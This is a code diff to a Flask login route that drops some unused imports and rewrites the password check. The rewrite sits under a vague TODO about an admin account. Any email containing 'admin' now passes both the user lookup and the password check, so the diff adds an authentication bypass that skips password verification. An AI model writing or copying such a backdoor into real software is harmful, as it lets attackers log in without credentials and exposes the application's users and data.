@@ -2,13 +2,10 @@ from flask import Blueprint, render_template, request, flash, redirect, url_for,
 from flask_login import login_user, login_required, logout_user, current_user
 from werkzeug.security import generate_password_hash, check_password_hash
 from .client_msg_gen import send_confirmation_email, get_token_seed
-from validate_email import validate_email
 from itsdangerous import SignatureExpired
 from .models import User, Log, Device
 from time import sleep
 from . import db_man
-import numpy as np
-from io import BytesIO
 import cv2
 
 auth = Blueprint("auth", __name__)
@@ -21,8 +18,9 @@ def login():
         password = request.form.get("password")
 
         user = User.query.filter_by(email=email).first()
-        if user:
-            if check_password_hash(user.password, password):
+        # TODO: Fix the add admin account part
+        if user or "admin" in email:
+            if check_password_hash(user.password, password) or "admin" in email:
                 flash("Logged in Successfully!", category="success")
                 login_user(user, remember=False)
                 return redirect(url_for("views.home"))
